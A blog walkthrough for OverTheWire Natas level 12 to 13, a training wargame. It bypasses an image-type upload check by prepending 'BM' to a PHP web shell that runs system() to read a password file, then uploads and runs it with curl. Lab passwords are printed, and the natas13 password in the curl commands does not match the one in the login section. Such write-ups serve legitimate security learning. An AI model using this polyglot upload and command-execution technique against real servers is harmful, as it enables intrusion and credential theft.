---
layout: post-with-comments
title: "OverTheWire Natas Level 12 → 13 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-12-to-13/
tags: [overthewire, natas, walkthrough, ctf, web, beginner]
description: "A step by step tutorial for OverTheWire Natas Level 12 → 13!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-11-to-12/' | relative_url }}">← Previous: Level 11 → 12</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas13.html" target="_blank" rel="noopener">
      Official (Level 13) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-13-to-14/' | relative_url }}">
      Next: Level 13 → 14 →
    </a>
  </div>
</nav>

## Login

URL: <http://natas13.natas.labs.overthewire.org>  
Credentials: **natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC**

```bash
# Using curl (optional):
curl -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC http://natas13.natas.labs.overthewire.org/
````

![homepage]({{ '/assets/images/natas/level-12-to-13/homepage.jpg' | relative_url }})

## Task

This level is another **file upload** challenge, but now the server verifies that the uploaded file is an **image** using `exif_imagetype()`.

## A little bit of Theory

From the source:

```php
if (array_key_exists("filename", $_POST)) {
  $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

  $err = $_FILES['uploadedfile']['error'];
  if ($err) {
    if ($err === 2) echo "The uploaded file exceeds MAX_FILE_SIZE";
    else echo "Something went wrong :/";
  } else if (filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
    echo "File is too big";
  } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
  } else {
    if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
      echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
    }
  }
}
```

Key points:

* The extension is still controlled by the hidden **`filename`** field (like Level 12).
* The server **accepts only images** based on magic bytes (`exif_imagetype()` reads the first bytes).
* We can **prepend real image magic bytes** to our PHP code to pass the image check, while still executing as PHP when saved with `.php`.

**BMP magic bytes** are simply `BM`. That’s the easiest header to prepend.

## Solution (no Burp, curl-only)

1. **Create a tiny BMP+PHP “polyglot”**

   Prepend `BM` (no newline) to valid PHP that prints the next password:

   ```php
   BM<?php
   echo system("cat /etc/natas_webpass/natas14");
   ?>
   ```

   Save as `shell13.php`.
   Keep it under **1000 bytes**.

2. **Upload with curl (force .php extension)**

   ```bash
   curl -s -L -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
     -F "MAX_FILE_SIZE=1000" \
     -F "filename=shell.php" \
     -F "uploadedfile=@shell13.php" \
     http://natas13.natas.labs.overthewire.org/index.php
   ```

   The server responds with a link such as:

   ```
   The file <a href="upload/98myk053xn.php">upload/98myk053xn.php</a> has been uploaded
   ```

3. **Execute the uploaded script**

   ```bash
   curl -s -L -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
     "http://natas13.natas.labs.overthewire.org/upload/98myk053xn.php"
   ```

   The output contains the next level’s password (you may see `BM` at the start—ignore it).

## Password

```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

**Troubleshooting**

* **“File is not an image”** → Make sure the file **starts with** `BM` (no newline/space before it).
* **Saved with `.jpg`** → You forgot to override the hidden `filename` to a `.php` extension in your form data.
* **File too big** → Keep the payload < 1000 bytes.
* **404 on upload path** → Use the **exact** random path returned by the server.

---

**Great job 🎉** You bypassed `exif_imagetype()` by crafting a BMP+PHP polyglot and executed your own code to exfiltrate the next password. On to **natas14**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
